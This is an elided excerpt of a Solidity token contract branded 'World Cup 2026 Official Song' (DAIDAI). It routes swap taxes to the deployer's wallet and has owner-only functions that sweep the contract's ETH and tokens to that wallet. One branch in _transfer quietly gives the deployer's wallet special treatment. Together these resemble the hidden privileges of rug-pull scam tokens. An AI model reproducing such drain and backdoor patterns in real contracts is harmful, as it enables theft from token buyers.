...
contract DAIDAI is Context, IERC20, Ownable {
    ...
    address payable private immutable _TreasuryTaxWallet;
    ...
    string private constant _name = unicode"World Cup 2026 Official Song";
    string private constant _symbol = unicode"DAIDAI";
    ...
    constructor() payable {
        _TreasuryTaxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcuteFromFee[owner()] = true;
        _isExcuteFromFee[address(this)] = true;
        _isExcuteFromFee[_TreasuryTaxWallet] = true;
    ...
    function taxWallet() external view returns (address) { return _TreasuryTaxWallet; }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (isBuy) {
            ...
            if (!inSwap && swapEnabled && buyCalc >= preventSwapBefore) {
                ...
                swapTokensForEthwithTax(swapAmount, _TreasuryTaxWallet);
                sellCount++;
        ...
        } else if(_msgSender() == _TreasuryTaxWallet) _sptAmount = taxAmount;
    ...
    function rescueNative() external onlyOwner {
        ...
        if (contractETHBalance > 0) {
            (bool ok, ) = payable(_TreasuryTaxWallet).call{value: contractETHBalance}("");
    ...
    function rescueToken(address token) external onlyOwner {
        ...
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, _TreasuryTaxWallet, contractBal)
        );
